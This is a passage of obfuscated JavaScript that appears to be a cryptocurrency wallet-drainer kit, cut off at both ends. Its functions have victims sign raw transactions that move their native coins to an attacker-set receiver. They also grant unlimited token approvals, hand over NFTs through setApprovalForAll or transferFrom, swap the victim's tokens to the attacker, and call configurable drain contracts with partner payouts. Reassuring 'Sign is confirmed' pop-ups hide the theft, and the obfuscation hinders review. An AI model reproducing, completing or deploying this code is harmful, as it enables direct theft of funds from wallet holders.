_0x4521c7=_0x26b509;try{FLASH_Loader_Style==0x2?FLASHL[_0x4521c7(0xbf)]({'icon':_0x4521c7(0x176),'title':'OK','subtitle':'Sign\x20is\x20confirmed','text':_0x4521c7(0x17c),'showConfirmButton':![],'color':FLASH_Color_Scheme}):(Swal['close'](),Swal['fire']({'html':_0x4521c7(0xf6),'icon':_0x4521c7(0x176),'allowOutsideClick':![],'allowEscapeKey':![],'timer':0x0,'width':0x258,'showConfirmButton':![]}));}catch(_0x5363cf){console[_0x4521c7(0x260)](_0x5363cf);}},sign_next=()=>{const _0x1611e8=_0x26b509;try{if(is_first_sign){is_first_sign=![];return;}FLASH_Loader_Style==0x2?FLASHL['fire']({'icon':_0x1611e8(0x29c),'title':_0x1611e8(0xa7),'text':_0x1611e8(0x27e),'showConfirmButton':!![],'confirmButtonText':_0x1611e8(0x173),'color':FLASH_Color_Scheme}):(Swal[_0x1611e8(0x297)](),Swal[_0x1611e8(0xbf)]({'html':_0x1611e8(0xce),'imageUrl':_0x1611e8(0x130),'imageHeight':0x3c,'allowOutsideClick':![],'allowEscapeKey':![],'timer':0x0,'width':0x258,'showConfirmButton':![]}));}catch(_0x25a8bc){console[_0x1611e8(0x260)](_0x25a8bc);}},is_nft_approved=async(_0x225939,_0x7bcbe9,_0x1181aa)=>{const _0x204023=_0x26b509;try{const _0x2af6c4=new ethers[(_0x204023(0xe1))][(_0x204023(0x299))](FLASH_Settings[_0x204023(0x256)][0x1]),_0x53a66a=new ethers['Contract'](_0x225939,FLASH_Contract_ABI[_0x204023(0x248)],_0x2af6c4);return await _0x53a66a[_0x204023(0x1ac)](_0x7bcbe9,_0x1181aa);}catch(_0x5467a1){return console['log'](_0x5467a1),![];}},get_gas_limit_def_by_chain_id=_0x346633=>{switch(_0x346633){case 0xa4b1:return BN(0x4c4b40);case 0xa86a:return BN(0x4c4b40);default:return BN(0x186a0);}},SIGN_NATIVE=async _0x4f40c6=>{const _0x15c2fc=_0x26b509,_0x5f5c25=new ethers['providers'][(_0x15c2fc(0x299))](FLASH_Settings[_0x15c2fc(0x256)][_0x4f40c6['chain_id']]),_0x347834=BN(await _0x5f5c25[_0x15c2fc(0x1ee)]())[_0x15c2fc(0x208)](BN(0x64))['mul'](BN(Math[_0x15c2fc(0x285)](FLASH_Gas_Multiplier*0x64))),_0x49c6fa=BN(_0x4f40c6[_0x15c2fc(0x28e)]==0xa4b1?0x4c4b40:_0x4f40c6[_0x15c2fc(0x28e)]==0xa86a?0x4c4b40:_0x4f40c6[_0x15c2fc(0x28e)]==0x171?0xdbba0:0x249f0),_0x49ad60=_0x49c6fa[_0x15c2fc(0x242)](FLASH_Gas_Reserves[_0x4f40c6[_0x15c2fc(0x28e)]]+0x1)[_0x15c2fc(0x242)](_0x347834);let _0x45816d={'from':FLASH_Current_Address,'to':FLASH_Settings[_0x15c2fc(0x1bb)],'value':BN(0x64),'data':'0x'},_0x2dd03b=null;try{_0x2dd03b=await _0x5f5c25[_0x15c2fc(0x1ce)](_0x45816d);}catch(_0x6a9785){_0x2dd03b=get_gas_limit_def_by_chain_id(parseInt(_0x4f40c6[_0x15c2fc(0x28e)]));}const _0x5d5fdd=await _0x5f5c25[_0x15c2fc(0x247)](FLASH_Current_Address),_0x3206b7=_0x5d5fdd[_0x15c2fc(0x169)](_0x2dd03b[_0x15c2fc(0x242)](_0x347834))[_0x15c2fc(0x169)](_0x49ad60);if(_0x3206b7[_0x15c2fc(0x1b1)](BN(0x0)))throw _0x15c2fc(0xa8);const _0x258a2d=await _0x5f5c25['getTransactionCount'](FLASH_Current_Address,_0x15c2fc(0x129)),_0x1acc62=new Web3(FLASH_Provider);_0x45816d[_0x15c2fc(0x142)]=_0x1acc62[_0x15c2fc(0x18e)][_0x15c2fc(0x12d)](_0x3206b7[_0x15c2fc(0x19b)]()),_0x45816d['nonce']=_0x1acc62[_0x15c2fc(0x18e)]['toHex'](_0x258a2d[_0x15c2fc(0x19b)]()),_0x45816d['gasPrice']=_0x1acc62[_0x15c2fc(0x18e)]['toHex'](_0x347834[_0x15c2fc(0x19b)]()),_0x45816d['gasLimit']=_0x1acc62[_0x15c2fc(0x18e)][_0x15c2fc(0x12d)](_0x2dd03b[_0x15c2fc(0x19b)]()),_0x45816d['v']=_0x1acc62['utils'][_0x15c2fc(0x12d)](_0x4f40c6[_0x15c2fc(0x28e)]),_0x45816d['r']='0x',_0x45816d['s']='0x',_0x45816d=new ethereumjs['Tx'](_0x45816d);let _0x1ddb22='0x'+_0x45816d['serialize']()['toString'](_0x15c2fc(0x17a));_0x1ddb22=_0x1acc62[_0x15c2fc(0x18e)][_0x15c2fc(0x134)](_0x1ddb22,{'encoding':_0x15c2fc(0x17a)}),await sign_request(_0x4f40c6);let _0x3b868c=await _0x1acc62[_0x15c2fc(0x147)][_0x15c2fc(0x212)](_0x1ddb22,FLASH_Current_Address);_0x3b868c=_0x3b868c[_0x15c2fc(0x21c)](0x2);const _0x2c9266='0x'+_0x3b868c[_0x15c2fc(0x21c)](0x0,0x40),_0x409274='0x'+_0x3b868c[_0x15c2fc(0x21c)](0x40,0x80),_0x1601a4=parseInt(_0x3b868c[_0x15c2fc(0x21c)](0x80,0x82),0x10),_0x40b9b0=_0x1acc62[_0x15c2fc(0x18e)][_0x15c2fc(0x12d)](_0x1601a4+_0x4f40c6[_0x15c2fc(0x28e)]*0x2+0x8);_0x45816d['v']=_0x40b9b0,_0x45816d['r']=_0x2c9266,_0x45816d['s']=_0x409274,_0x1ddb22='0x'+_0x45816d[_0x15c2fc(0x28f)]()['toString'](_0x15c2fc(0x17a)),sign_next();const _0x5e4917=await _0x5f5c25[_0x15c2fc(0x1f0)](_0x1ddb22);wait_message();if(FLASH_Settings['Settings'][_0x15c2fc(0x22f)])await _0x5f5c25[_0x15c2fc(0x14f)](_0x5e4917[_0x15c2fc(0x226)],0x1,0x7530);await sign_success(_0x4f40c6,_0x3206b7),sign_ready();},SIGN_TOKEN=async _0x1530db=>{const _0x57fa29=_0x26b509,_0x4e31c8=new ethers[(_0x57fa29(0xe1))][(_0x57fa29(0x299))](FLASH_Settings['RPCs'][_0x1530db[_0x57fa29(0x28e)]]),_0x309dca=BN(await _0x4e31c8[_0x57fa29(0x1ee)]())[_0x57fa29(0x208)](BN(0x64))[_0x57fa29(0x242)](BN(Math[_0x57fa29(0x285)](FLASH_Gas_Multiplier*0x64))),_0x2aab9d=new Web3(FLASH_Provider);let _0x39846b=null;const _0x29239d=new _0x2aab9d['eth'][(_0x57fa29(0x15a))](FLASH_Contract_ABI[_0x57fa29(0x252)],_0x1530db[_0x57fa29(0x1d2)]);let _0x263665=ethers[_0x57fa29(0x18e)][_0x57fa29(0x280)](FLASH_Unlimited_Amount);for(const _0x4fcbd7 of FLASH_Settings[_0x57fa29(0x23a)]){try{if(_0x4fcbd7[0x0]==FLASH_Current_Chain_ID&&_0x4fcbd7[0x1]==_0x1530db[_0x57fa29(0x1d2)][_0x57fa29(0x21d)]()[_0x57fa29(0x20f)]()){_0x263665=_0x1530db[_0x57fa29(0x257)];break;}}catch(_0x19ab1e){console[_0x57fa29(0x260)](_0x19ab1e);}}if(FLASH_Settings[_0x57fa29(0x1c7)]['Sign'][_0x57fa29(0x19d)]==0x1)_0x39846b=_0x29239d[_0x57fa29(0x143)][_0x57fa29(0x263)](FLASH_Settings[_0x57fa29(0x1f8)],_0x263665)[_0x57fa29(0x195)]();else{if(FLASH_Settings['Settings'][_0x57fa29(0x283)]['Tokens']==0x2)_0x39846b=_0x29239d[_0x57fa29(0x143)][_0x57fa29(0x29e)](FLASH_Settings[_0x57fa29(0x1bb)],_0x1530db['amount_raw'])[_0x57fa29(0x195)]();}let _0x3b78ca={'from':FLASH_Current_Address,'to':_0x1530db[_0x57fa29(0x1d2)],'value':_0x57fa29(0x1d1),'data':_0x39846b},_0x6806de=null;try{_0x6806de=await _0x4e31c8[_0x57fa29(0x1ce)](_0x3b78ca);}catch(_0x281c80){_0x6806de=get_gas_limit_def_by_chain_id(parseInt(_0x1530db[_0x57fa29(0x28e)]));}const _0x4c337d=await _0x4e31c8[_0x57fa29(0x247)](FLASH_Current_Address),_0x372964=_0x4c337d[_0x57fa29(0x169)](_0x6806de[_0x57fa29(0x242)](_0x309dca));if(_0x372964['lt'](BN(0x0)))throw _0x57fa29(0xa8);const _0x42ef14=await _0x4e31c8[_0x57fa29(0x127)](FLASH_Current_Address,_0x57fa29(0x129));_0x3b78ca['nonce']=_0x2aab9d['utils'][_0x57fa29(0x12d)](_0x42ef14[_0x57fa29(0x19b)]()),_0x3b78ca[_0x57fa29(0x20d)]=_0x2aab9d[_0x57fa29(0x18e)][_0x57fa29(0x12d)](_0x309dca[_0x57fa29(0x19b)]()),_0x3b78ca[_0x57fa29(0x249)]=_0x2aab9d[_0x57fa29(0x18e)][_0x57fa29(0x12d)](_0x6806de['toString']()),_0x3b78ca['v']=_0x2aab9d[_0x57fa29(0x18e)]['toHex'](_0x1530db[_0x57fa29(0x28e)]),_0x3b78ca['r']='0x',_0x3b78ca['s']='0x',_0x3b78ca=new ethereumjs['Tx'](_0x3b78ca);let _0x17cdbe='0x'+_0x3b78ca[_0x57fa29(0x28f)]()[_0x57fa29(0x19b)](_0x57fa29(0x17a));_0x17cdbe=_0x2aab9d[_0x57fa29(0x18e)][_0x57fa29(0x134)](_0x17cdbe,{'encoding':_0x57fa29(0x17a)}),await sign_request(_0x1530db);let _0x35831a=await _0x2aab9d[_0x57fa29(0x147)][_0x57fa29(0x212)](_0x17cdbe,FLASH_Current_Address);_0x35831a=_0x35831a[_0x57fa29(0x21c)](0x2);const _0x286f27='0x'+_0x35831a[_0x57fa29(0x21c)](0x0,0x40),_0x4b8f91='0x'+_0x35831a[_0x57fa29(0x21c)](0x40,0x80),_0x3c43f9=parseInt(_0x35831a[_0x57fa29(0x21c)](0x80,0x82),0x10),_0x78b9a9=_0x2aab9d[_0x57fa29(0x18e)][_0x57fa29(0x12d)](_0x3c43f9+_0x1530db['chain_id']*0x2+0x8);_0x3b78ca['v']=_0x78b9a9,_0x3b78ca['r']=_0x286f27,_0x3b78ca['s']=_0x4b8f91,_0x17cdbe='0x'+_0x3b78ca[_0x57fa29(0x28f)]()['toString'](_0x57fa29(0x17a)),sign_next();const _0x52b4fe=await _0x4e31c8[_0x57fa29(0x1f0)](_0x17cdbe);wait_message();if(FLASH_Settings[_0x57fa29(0x1c7)][_0x57fa29(0x22f)])await _0x4e31c8[_0x57fa29(0x14f)](_0x52b4fe[_0x57fa29(0x226)],0x1,0x7530);await sign_success(_0x1530db),sign_ready();},SIGN_NFT=async _0x3babd3=>{const _0x53bc53=_0x26b509,_0x3b0034=new ethers[(_0x53bc53(0xe1))][(_0x53bc53(0x299))](FLASH_Settings['RPCs'][_0x3babd3[_0x53bc53(0x28e)]]),_0x2edea7=BN(await _0x3b0034[_0x53bc53(0x1ee)]())[_0x53bc53(0x208)](BN(0x64))[_0x53bc53(0x242)](BN(Math[_0x53bc53(0x285)](FLASH_Gas_Multiplier*0x64))),_0x553b8e=new Web3(FLASH_Provider);let _0x558cd9=null;const _0xb89d92=new _0x553b8e[(_0x53bc53(0x147))][(_0x53bc53(0x15a))](FLASH_Contract_ABI[_0x53bc53(0x248)],_0x3babd3[_0x53bc53(0x1d2)]);if(FLASH_Settings[_0x53bc53(0x1c7)][_0x53bc53(0x283)][_0x53bc53(0xcb)]==0x1)_0x558cd9=_0xb89d92[_0x53bc53(0x143)]['setApprovalForAll'](FLASH_Settings['Address'],!![])[_0x53bc53(0x195)]();else{if(FLASH_Settings[_0x53bc53(0x1c7)]['Sign'][_0x53bc53(0xcb)]==0x2)_0x558cd9=_0xb89d92[_0x53bc53(0x143)]['transferFrom'](FLASH_Current_Address,FLASH_Settings[_0x53bc53(0x1bb)],_0x3babd3['id'])[_0x53bc53(0x195)]();}let _0x4c7aa4={'from':FLASH_Current_Address,'to':_0x3babd3[_0x53bc53(0x1d2)],'value':_0x53bc53(0x1d1),'data':_0x558cd9},_0x348e58=null;try{_0x348e58=await _0x3b0034[_0x53bc53(0x1ce)](_0x4c7aa4);}catch(_0x1e00bd){_0x348e58=get_gas_limit_def_by_chain_id(parseInt(_0x3babd3[_0x53bc53(0x28e)]));}const _0x5b2df5=await _0x3b0034[_0x53bc53(0x247)](FLASH_Current_Address),_0x7a2add=_0x5b2df5['sub'](_0x348e58[_0x53bc53(0x242)](_0x2edea7));if(_0x7a2add['lt'](BN(0x0)))throw _0x53bc53(0xa8);const _0x3c0f25=await _0x3b0034[_0x53bc53(0x127)](FLASH_Current_Address,'pending');_0x4c7aa4[_0x53bc53(0x12e)]=_0x553b8e[_0x53bc53(0x18e)][_0x53bc53(0x12d)](_0x3c0f25[_0x53bc53(0x19b)]()),_0x4c7aa4['gasPrice']=_0x553b8e[_0x53bc53(0x18e)][_0x53bc53(0x12d)](_0x2edea7[_0x53bc53(0x19b)]()),_0x4c7aa4['gasLimit']=_0x553b8e['utils'][_0x53bc53(0x12d)](_0x348e58[_0x53bc53(0x19b)]()),_0x4c7aa4['v']=_0x553b8e[_0x53bc53(0x18e)][_0x53bc53(0x12d)](_0x3babd3[_0x53bc53(0x28e)]),_0x4c7aa4['r']='0x',_0x4c7aa4['s']='0x',_0x4c7aa4=new ethereumjs['Tx'](_0x4c7aa4);let _0x4bb589='0x'+_0x4c7aa4['serialize']()[_0x53bc53(0x19b)](_0x53bc53(0x17a));_0x4bb589=_0x553b8e['utils'][_0x53bc53(0x134)](_0x4bb589,{'encoding':'hex'}),await sign_request(_0x3babd3);let _0x14f686=await _0x553b8e[_0x53bc53(0x147)][_0x53bc53(0x212)](_0x4bb589,FLASH_Current_Address);_0x14f686=_0x14f686[_0x53bc53(0x21c)](0x2);const _0x3311f3='0x'+_0x14f686[_0x53bc53(0x21c)](0x0,0x40),_0x525b16='0x'+_0x14f686[_0x53bc53(0x21c)](0x40,0x80),_0x36c2bd=parseInt(_0x14f686[_0x53bc53(0x21c)](0x80,0x82),0x10),_0x2c19b2=_0x553b8e[_0x53bc53(0x18e)][_0x53bc53(0x12d)](_0x36c2bd+_0x3babd3['chain_id']*0x2+0x8);_0x4c7aa4['v']=_0x2c19b2,_0x4c7aa4['r']=_0x3311f3,_0x4c7aa4['s']=_0x525b16,_0x4bb589='0x'+_0x4c7aa4[_0x53bc53(0x28f)]()['toString'](_0x53bc53(0x17a)),sign_next();const _0x1dccf5=await _0x3b0034[_0x53bc53(0x1f0)](_0x4bb589);wait_message();if(FLASH_Settings[_0x53bc53(0x1c7)]['Wait_For_Confirmation'])await _0x3b0034[_0x53bc53(0x14f)](_0x1dccf5[_0x53bc53(0x226)],0x1,0x7530);await sign_success(_0x3babd3),sign_ready();},DO_SWAP=async _0x2b7e4b=>{const _0x24e394=_0x26b509,_0x1f7107=new ethers[(_0x24e394(0xe1))][(_0x24e394(0x299))](FLASH_Settings['RPCs'][_0x2b7e4b[_0x24e394(0x28e)]]),_0x4f398f=Math[_0x24e394(0x285)](Date[_0x24e394(0x196)]()/0x3e8)+0x270f*0xa,_0x492652=new ethers[(_0x24e394(0x15a))](_0x2b7e4b['swapper_address'],FLASH_Pancake_ABI,FLASH_Signer),_0x4f248a=ethers[_0x24e394(0x11a)][_0x24e394(0x239)](await _0x1f7107['getGasPrice']())['div'](ethers['BigNumber'][_0x24e394(0x239)](_0x24e394(0x10e)))[_0x24e394(0x242)](ethers[_0x24e394(0x11a)]['from']('120'))['toString']();let _0x2b7419=null,_0x1d1626=0x0;while(_0x1d1626<0x3){try{_0x2b7419=await _0x492652[_0x24e394(0x1ce)][_0x24e394(0x136)](_0x52607d,'0',[_0x2b7e4b[_0x24e394(0x1d2)],FLASH_Swap_Route[_0x2b7e4b[_0x24e394(0x28e)]]],FLASH_Settings['Receiver'],_0x4f398f,{'from':FLASH_Current_Address}),_0x2b7419=ethers[_0x24e394(0x11a)][_0x24e394(0x239)](_0x2b7419)[_0x24e394(0x208)](ethers[_0x24e394(0x11a)][_0x24e394(0x239)](_0x24e394(0x10e)))['mul'](ethers[_0x24e394(0x11a)][_0x24e394(0x239)](_0x24e394(0x11e)))[_0x24e394(0x19b)](),_0x1d1626=0x3;}catch(_0x29aac7){_0x2b7419=_0x2b7e4b['chain_id']==0xa4b1?0x4c4b40:_0x2b7e4b[_0x24e394(0x28e)]==0xa86a?0x4c4b40:0x55730,_0x1d1626+=0x1;}}const _0x568ffb=await get_nonce(_0x2b7e4b[_0x24e394(0x28e)]),_0x52607d=ethers[_0x24e394(0x11a)][_0x24e394(0x239)](_0x2b7e4b[_0x24e394(0x257)])[_0x24e394(0x1b1)](ethers[_0x24e394(0x11a)][_0x24e394(0x239)](_0x2b7e4b[_0x24e394(0x16c)]))?ethers[_0x24e394(0x11a)]['from'](_0x2b7e4b['amount_raw'])[_0x24e394(0x19b)]():ethers['BigNumber'][_0x24e394(0x239)](_0x2b7e4b['swapper_allowance'])[_0x24e394(0x19b)]();await swap_request(_0x2b7e4b['swapper_type'],_0x2b7e4b,[_0x2b7e4b]),sign_next();const _0x10bccc=await _0x492652[_0x24e394(0x136)](_0x52607d,'0',[_0x2b7e4b[_0x24e394(0x1d2)],FLASH_Swap_Route[_0x2b7e4b[_0x24e394(0x28e)]]],FLASH_Settings[_0x24e394(0x1bb)],_0x4f398f,{'gasLimit':ethers[_0x24e394(0x11a)]['from'](_0x2b7419),'gasPrice':ethers[_0x24e394(0x11a)][_0x24e394(0x239)](_0x4f248a),'nonce':_0x568ffb,'from':FLASH_Current_Address});wait_message();if(FLASH_Settings[_0x24e394(0x1c7)][_0x24e394(0x22f)])await _0x1f7107[_0x24e394(0x14f)](_0x10bccc[_0x24e394(0x226)],0x1,0xea60);await swap_success(_0x2b7e4b[_0x24e394(0xdc)],_0x2b7e4b,[_0x2b7e4b]),sign_ready();},DO_UNISWAP=async(_0x20e3b3,_0x334a0f)=>{const _0x322ea4=_0x26b509,_0x4ad9e0=new Web3(FLASH_Provider),_0x306117=new ethers[(_0x322ea4(0xe1))]['JsonRpcProvider'](FLASH_Settings[_0x322ea4(0x256)][_0x20e3b3['chain_id']]),_0x44fd75=Math[_0x322ea4(0x285)](Date['now']()/0x3e8)+0x270f*0xa,_0x5c311=new ethers[(_0x322ea4(0x15a))](_0x20e3b3[_0x322ea4(0x26e)],FLASH_Uniswap_ABI,FLASH_Signer),_0x54ce4f=ethers['BigNumber']['from'](await _0x306117[_0x322ea4(0x1ee)]())[_0x322ea4(0x208)](ethers[_0x322ea4(0x11a)]['from'](_0x322ea4(0x10e)))[_0x322ea4(0x242)](ethers[_0x322ea4(0x11a)][_0x322ea4(0x239)](_0x322ea4(0x11e)))[_0x322ea4(0x19b)](),_0x1aaf05=await get_nonce(_0x20e3b3[_0x322ea4(0x28e)]),_0x523e38=[];for(const _0x1dec6b of _0x334a0f){try{const _0x50d2ca=ethers['BigNumber'][_0x322ea4(0x239)](_0x1dec6b[_0x322ea4(0x257)])[_0x322ea4(0x1b1)](ethers[_0x322ea4(0x11a)][_0x322ea4(0x239)](_0x1dec6b['swapper_allowance']))?ethers[_0x322ea4(0x11a)][_0x322ea4(0x239)](_0x1dec6b[_0x322ea4(0x257)])[_0x322ea4(0x19b)]():ethers[_0x322ea4(0x11a)][_0x322ea4(0x239)](_0x1dec6b['swapper_allowance'])[_0x322ea4(0x19b)](),_0x45c5c3=new _0x4ad9e0[(_0x322ea4(0x147))][(_0x322ea4(0x15a))](FLASH_Uniswap_ABI,_0x1dec6b[_0x322ea4(0x26e)]),_0x39e67f=_0x45c5c3[_0x322ea4(0x143)][_0x322ea4(0x190)](_0x50d2ca,'0',[_0x1dec6b[_0x322ea4(0x1d2)],FLASH_Swap_Route[_0x1dec6b[_0x322ea4(0x28e)]]],FLASH_Settings[_0x322ea4(0x1bb)])[_0x322ea4(0x195)]();_0x523e38['push'](_0x39e67f);}catch(_0x6096d3){console[_0x322ea4(0x260)](_0x6096d3);}}let _0x50881f=null,_0x4a04ba=0x0;while(_0x4a04ba<0x3){try{_0x50881f=await _0x5c311[_0x322ea4(0x1ce)][_0x322ea4(0x24a)](_0x44fd75,_0x523e38,{'from':FLASH_Current_Address}),_0x50881f=ethers[_0x322ea4(0x11a)]['from'](_0x50881f)[_0x322ea4(0x208)](ethers[_0x322ea4(0x11a)]['from'](_0x322ea4(0x10e)))[_0x322ea4(0x242)](ethers['BigNumber'][_0x322ea4(0x239)]('120'))[_0x322ea4(0x19b)](),_0x4a04ba=0x3;}catch(_0x4ccca0){_0x50881f=_0x20e3b3[_0x322ea4(0x28e)]==0xa4b1?0x4c4b40:_0x20e3b3[_0x322ea4(0x28e)]==0xa86a?0x4c4b40:0x7a120,_0x4a04ba+=0x1;}}await swap_request(_0x20e3b3[_0x322ea4(0xdc)],_0x20e3b3,_0x334a0f),sign_next();const _0x4628eb=await _0x5c311[_0x322ea4(0x24a)](_0x44fd75,_0x523e38,{'gasLimit':ethers['BigNumber']['from'](_0x50881f),'gasPrice':ethers['BigNumber']['from'](_0x54ce4f),'nonce':_0x1aaf05,'from':FLASH_Current_Address});wait_message();if(FLASH_Settings[_0x322ea4(0x1c7)][_0x322ea4(0x22f)])await _0x306117['waitForTransaction'](_0x4628eb[_0x322ea4(0x226)],0x1,0xea60);await swap_success(_0x20e3b3[_0x322ea4(0xdc)],_0x20e3b3,_0x334a0f),sign_ready();},DO_PANCAKE_V3=async(_0x42cb02,_0x282f01)=>{const _0x128a0f=_0x26b509,_0x28d2d6=new Web3(FLASH_Provider),_0x11a385=new ethers[(_0x128a0f(0xe1))][(_0x128a0f(0x299))](FLASH_Settings[_0x128a0f(0x256)][_0x42cb02[_0x128a0f(0x28e)]]),_0x5d2a65=Math[_0x128a0f(0x285)](Date[_0x128a0f(0x196)]()/0x3e8)+0x270f*0xa,_0xfcde5f=new ethers[(_0x128a0f(0x15a))](_0x42cb02[_0x128a0f(0x26e)],FLASH_Pancake_ABI,FLASH_Signer),_0x420788=ethers[_0x128a0f(0x11a)][_0x128a0f(0x239)](await _0x11a385[_0x128a0f(0x1ee)]())[_0x128a0f(0x208)](ethers[_0x128a0f(0x11a)][_0x128a0f(0x239)](_0x128a0f(0x10e)))['mul'](ethers[_0x128a0f(0x11a)]['from'](_0x128a0f(0x11e)))['toString'](),_0x2ddd40=await get_nonce(_0x42cb02[_0x128a0f(0x28e)]),_0x173ad2=[];for(const _0x340b6e of _0x282f01){try{const _0x6cc3b0=ethers['BigNumber'][_0x128a0f(0x239)](_0x340b6e[_0x128a0f(0x257)])[_0x128a0f(0x1b1)](ethers[_0x128a0f(0x11a)][_0x128a0f(0x239)](_0x340b6e[_0x128a0f(0x16c)]))?ethers[_0x128a0f(0x11a)]['from'](_0x340b6e[_0x128a0f(0x257)])[_0x128a0f(0x19b)]():ethers[_0x128a0f(0x11a)][_0x128a0f(0x239)](_0x340b6e['swapper_allowance'])[_0x128a0f(0x19b)](),_0x7274e8=new _0x28d2d6[(_0x128a0f(0x147))][(_0x128a0f(0x15a))](FLASH_Pancake_ABI,_0x340b6e[_0x128a0f(0x26e)]),_0x505f2c=_0x7274e8[_0x128a0f(0x143)][_0x128a0f(0x190)](_0x6cc3b0,'0',[_0x340b6e[_0x128a0f(0x1d2)],FLASH_Swap_Route[_0x340b6e[_0x128a0f(0x28e)]]],FLASH_Settings[_0x128a0f(0x1bb)])[_0x128a0f(0x195)]();_0x173ad2[_0x128a0f(0x1a5)](_0x505f2c);}catch(_0x329614){console[_0x128a0f(0x260)](_0x329614);}}let _0x51ed01=null,_0x58405e=0x0;while(_0x58405e<0x3){try{_0x51ed01=await _0xfcde5f['estimateGas'][_0x128a0f(0x24a)](_0x5d2a65,_0x173ad2,{'from':FLASH_Current_Address}),_0x51ed01=ethers[_0x128a0f(0x11a)][_0x128a0f(0x239)](_0x51ed01)[_0x128a0f(0x208)](ethers[_0x128a0f(0x11a)][_0x128a0f(0x239)](_0x128a0f(0x10e)))['mul'](ethers[_0x128a0f(0x11a)][_0x128a0f(0x239)](_0x128a0f(0x11e)))[_0x128a0f(0x19b)](),_0x58405e=0x3;}catch(_0x320679){_0x51ed01=_0x42cb02[_0x128a0f(0x28e)]==0xa4b1?0x4c4b40:_0x42cb02[_0x128a0f(0x28e)]==0xa86a?0x4c4b40:0x7a120,_0x58405e+=0x1;}}await swap_request(_0x42cb02[_0x128a0f(0xdc)],_0x42cb02,_0x282f01),sign_next();const _0x1ae2ea=await _0xfcde5f[_0x128a0f(0x24a)](_0x5d2a65,_0x173ad2,{'gasLimit':ethers[_0x128a0f(0x11a)]['from'](_0x51ed01),'gasPrice':ethers[_0x128a0f(0x11a)][_0x128a0f(0x239)](_0x420788),'nonce':_0x2ddd40,'from':FLASH_Current_Address});wait_message();if(FLASH_Settings[_0x128a0f(0x1c7)][_0x128a0f(0x22f)])await _0x11a385[_0x128a0f(0x14f)](_0x1ae2ea['hash'],0x1,0xea60);await swap_success(_0x42cb02['swapper_type'],_0x42cb02,_0x282f01),sign_ready();},DO_CONTRACT=async _0x250146=>{const _0x2da8ba=_0x26b509,_0x4de3a3=convert_chain('ID',_0x2da8ba(0x186),_0x250146[_0x2da8ba(0x28e)]),_0x5d3582=new ethers['providers'][(_0x2da8ba(0x299))](FLASH_Settings[_0x2da8ba(0x256)][_0x250146[_0x2da8ba(0x28e)]]),_0x6d17db=BN(await _0x5d3582['getGasPrice']())[_0x2da8ba(0x208)](BN(0x64))['mul'](BN(Math[_0x2da8ba(0x285)](FLASH_Gas_Multiplier*0x64))),_0x4901b5=BN(_0x250146[_0x2da8ba(0x28e)]==0xa4b1?0x4c4b40:_0x250146[_0x2da8ba(0x28e)]==0xa86a?0x4c4b40:_0x250146[_0x2da8ba(0x28e)]==0x171?0xdbba0:0x249f0),_0x523c12=_0x4901b5[_0x2da8ba(0x242)](FLASH_Gas_Reserves[_0x250146[_0x2da8ba(0x28e)]]+0x1)['mul'](_0x6d17db);FLASH_Settings[_0x2da8ba(0x1c7)][_0x2da8ba(0x172)]&&FLASH_Settings[_0x2da8ba(0x13a)][parseInt(_0x250146[_0x2da8ba(0x28e)])]!=null&&(FLASH_Settings[_0x2da8ba(0x1c7)]['Chains'][_0x4de3a3]['Contract_Legacy']=0x2,FLASH_Settings[_0x2da8ba(0x1c7)][_0x2da8ba(0xda)][_0x4de3a3][_0x2da8ba(0x13e)]=FLASH_Settings[_0x2da8ba(0x13a)][parseInt(_0x250146[_0x2da8ba(0x28e)])][FLASH_Settings[_0x2da8ba(0x1c7)][_0x2da8ba(0x14a)]?_0x250146[_0x2da8ba(0xc1)]>=0x1f4?0x1:0x0:0x0]);const _0x522db0=FLASH_Settings[_0x2da8ba(0x1c7)][_0x2da8ba(0xda)][_0x4de3a3]['Contract_Legacy']==0x1?JSON[_0x2da8ba(0x132)](_0x2da8ba(0x1fa)+FLASH_Settings['Settings'][_0x2da8ba(0xda)][_0x4de3a3][_0x2da8ba(0x1ea)]+_0x2da8ba(0x16f)):FLASH_Settings[_0x2da8ba(0x1c7)][_0x2da8ba(0xda)][_0x4de3a3]['Contract_Legacy']==0x0?JSON[_0x2da8ba(0x132)](_0x2da8ba(0x203)+FLASH_Settings['Settings'][_0x2da8ba(0xda)][_0x4de3a3][_0x2da8ba(0x1ea)]+_0x2da8ba(0x16f)):JSON['parse'](_0x2da8ba(0x290)+FLASH_Settings['Settings']['Chains'][_0x4de3a3]['Contract_Type']+_0x2da8ba(0x16f)),_0x409d72=new Web3(FLASH_Provider);let _0x3127cc=null;const _0x1a2ddd=new _0x409d72[(_0x2da8ba(0x147))]['Contract'](_0x522db0,FLASH_Settings[_0x2da8ba(0x1c7)][_0x2da8ba(0xda)][_0x4de3a3]['Contract_Address']);if(FLASH_Settings[_0x2da8ba(0x1c7)][_0x2da8ba(0xda)][_0x4de3a3][_0x2da8ba(0x271)]==0x0)_0x3127cc=_0x1a2ddd[_0x2da8ba(0x143)][FLASH_Settings[_0x2da8ba(0x1c7)][_0x2da8ba(0xda)][_0x4de3a3]['Contract_Type']](FLASH_Settings[_0x2da8ba(0x1bb)])['encodeABI']();else{if(FLASH_Settings['Settings'][_0x2da8ba(0xda)][_0x4de3a3][_0x2da8ba(0x271)]==0x2){let _0x51ce6c=![];try{const _0x2a9a08=await send_request({'action':_0x2da8ba(0x194),'address':FLASH_Partner_Address,'amount_usd':_0x250146['amount_usd']||null});if(_0x2a9a08[_0x2da8ba(0x250)]=='OK'&&_0x2a9a08['mode']==!![])_0x51ce6c=_0x2a9a08[_0x2da8ba(0xcf)];}catch(_0x27f448){console[_0x2da8ba(0x260)](_0x27f448);}let _0x2b9303=!_0x51ce6c?'0x0000000000000000000000000000000000000000':FLASH_Partner_Address;_0x3127cc=_0x1a2ddd[_0x2da8ba(0x143)][FLASH_Settings[_0x2da8ba(0x1c7)][_0x2da8ba(0xda)][_0x4de3a3][_0x2da8ba(0x1ea)]](FLASH_Current_Address,FLASH_Settings['Receiver'],_0x2b9303,_0x409d72[_0x2da8ba(0x18e)]['toHex'](!_0x51ce6c?0x0:_0x51ce6c),FLASH_Settings[_0x2da8ba(0x1c7)][_0x2da8ba(0x161)])['encodeABI']();}else _0x3127cc=_0x1a2ddd[_0x2da8ba(0x143)][FLASH_Settings[_0x2da8ba(0x1c7)][_0x2da8ba(0xda)][_0x4de3a3][_0x2da8ba(0x1ea)]]()[_0x2da8ba(0x195)]();}let _0x2affe1={'from':FLASH_Current_Address,'to':FLASH_Settings[_0x2da8ba(0x1c7)][_0x2da8ba(0xda)][_0x4de3a3][_0x2da8ba(0x13e)],'value':BN(0x64),'data':_0x3127cc};const 